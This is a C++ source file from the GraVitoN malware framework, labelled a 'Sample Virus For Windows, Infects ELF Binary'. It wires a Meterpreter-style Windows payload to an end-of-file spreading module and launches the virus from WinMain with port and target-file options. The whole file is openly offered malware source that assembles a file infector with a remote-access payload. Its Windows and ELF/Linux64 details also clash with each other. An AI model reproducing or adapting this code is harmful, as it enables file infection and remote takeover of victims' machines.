/**
 * @file
 *
 * @author  Sina Hatef Matbue ( _null_ ) <sinahatef.cpp@gmail.com>
 *
 * @section License
 *
 * This file is part of GraVitoN.
 *
 * Graviton is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * Graviton is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with Graviton.  If not, see http://www.gnu.org/licenses/.
 *
 * @brief Sample Virus For Windows, Infects ELF Binary
 *
 */

/// Activate/Deactivate GraVitoN logger
// #define GVN_ACTIVATE_LOGGER
/// Print logs into a file
// #define GVN_LOG_INTO_FILE
/// Path to Log File
// #define GVN_LOG_FILE "graviton_logs.txt"

#include <windows.h>
#include "../../../graviton.hpp"
#include "../../../gvn_ai/gvn_ai_virus_sample.hpp"
#include "../../../gvn_spread/generic/gvn_spread_endoffile.hpp"
#include "../../../gvn_payload/windows/gvn_payload_meter_w32b_kasper.hpp"

class My_Virus_AI : public AI_Virus_Sample
{
protected:
	virtual bool initializeInternalComponents()
	{
		payload = new Payload_Meter_W32b_Kasper();
		spread = new Spread_EndOfFile();

		payload->initialize(options);
		spread->initialize(options);
	}
};

int WINAPI WinMain(HINSTANCE h_instance, HINSTANCE h_prev_instance, LPSTR cmd, int n_cmd)
//int main()
{
	/// stdout redirected to graviton_logs.txt
	GraVitoN::Logger::logItLn("Beginning...");

	My_Virus_AI viri;
	
	viri.initialize(
		" PORT=7357 "
		""
		" Decom=Linux64 "
		" Target=decom/target "
		" DecTarget='my_target' "
		" DecTargetPath='' "
		" NumFiles=1 "
		" File1=graviton "
		" DecFile1=graviton "
		" DecFilePath1='' "
		" IsExec1=true ");
	viri.run();

	return 0;
}
